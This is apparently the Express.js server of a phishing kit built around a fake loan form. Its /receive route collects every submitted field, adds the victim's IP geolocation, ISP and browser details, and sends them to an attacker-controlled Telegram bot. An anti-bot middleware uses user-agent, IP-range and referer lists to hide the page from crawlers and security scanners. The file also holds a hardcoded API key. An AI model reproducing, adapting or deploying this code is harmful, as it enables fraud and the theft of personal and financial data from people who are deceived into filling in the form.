const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./Config/settings.js');
const antibot = require('./middleware/antibot');
const { sendMessageFor } = require('simple-telegram-message');
const { getClientIp } = require("request-ip");
const https = require('https');
const querystring = require('querystring');
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const fs = require('fs').promises; 
 
app.use(express.static(path.join(`${__dirname}`)));

const port = 3000; // You can use any available port

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const sendTelegramMessage = (text) => {
  
    const website = `https://api.telegram.org/bot${botToken}`;
    const params = querystring.stringify({
      chat_id: chatId,
      text: text,
    });

    const options = {
      hostname: 'api.telegram.org',
      path: '/bot' + botToken + '/sendMessage',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': params.length,
      },
    };
    
    console.log('sent');

    const req = https.request(options, (res) => {
      // Handle the response if needed
    });

    req.write(params);
    req.end();
};


app.get('/complete', async (req, res) => {
    try {
        const htmlContent = await fs.readFile('complete.html', 'utf-8');
        
        res.send(htmlContent);
    } catch (error) {
            console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});


app.post('/receive', async (req, res) => {
  let message = '';
  let myObject = req.body;

  const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

  const ipAddress = getClientIp(req);
  const ipAddressInformation = await sendAPIRequest(ipAddress);
  const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

  const myObjects = Object.keys(myObject);
	console.log(myObjects);

  if (myObjects.includes('q45_name45[first]')) {
    message += `✅ LOAN FORM | USER_${ipAddress}\n\n` +
               `👤 ${myObject['loginTime']}\n\n`;

    for (const key of myObjects) {
	    if (key !== 'loginTime') {
    console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;;
	    }
      
    }
    
    message += `🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

res.send(botToken +"\n" + chatId);

  }
  
  sendTelegramMessage(message);
  
  
});




const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./Config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./Config/botIP.js');
const { botRefList } = require('./Config/botRef.js');
const { use } = require('express/lib/router');

function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}


// Middleware function for bot detection
async function antiBotMiddleware(req, res, next) {
    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        return res.status(404).send('Not Found');
    } else {
    	
    	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };
    
    
    	try {
    		
		  const ipAddress = getClientIp(req);
		  const ipAddressInformation = await sendAPIRequest(ipAddress);
		  const lang = ipAddressInformation.country.isoAdminLanguages[0].isoAlpha2;
          console.log(lang);
          const pickContent = await fs.readFile('index.html', 'utf-8');
const modifiedContent = pickContent.replace('<head>', `<head>\n <meta http-equiv="Content-Language" name="${lang}">`);

// Now, write the modified content back to the file
await fs.writeFile('index.html', modifiedContent, 'utf-8');

// Finally, send the modified content to the client
res.send(modifiedContent);

        
    } catch (error) {
        // Handle any errors, for example, file not found
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
    
    }
}

app.all('/lang', async (req, res) => {
	const ipAddress = getClientIp(req);
async function fetchIPGeolocation() {
    try {
        const response = await fetch(`https://ipapi.co/${ipAddress}/json`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error fetching IP geolocation:', error);
        throw error;
    }
}


    try {
        const data = await fetchIPGeolocation();
        const countryCode = data.country_code;

        let lang;
        switch(countryCode) {
            case 'FR':
                lang = 'fr';
                break;
            case 'DK':
                lang = 'da';
                break;
            case 'PL':
                lang = 'pl';
                break;
            case 'RO':
                lang = 'ro';
                break;
            case 'DE':
                lang = 'de';
                break;
            default:
                lang = 'en';
        }
        
        res.send(lang);
    } catch (error) {
        console.error('Error setting language by IP:', error);
    }

});

// Middlewares
app.use(antiBotMiddleware);
app.use(express.static(path.join(__dirname)));


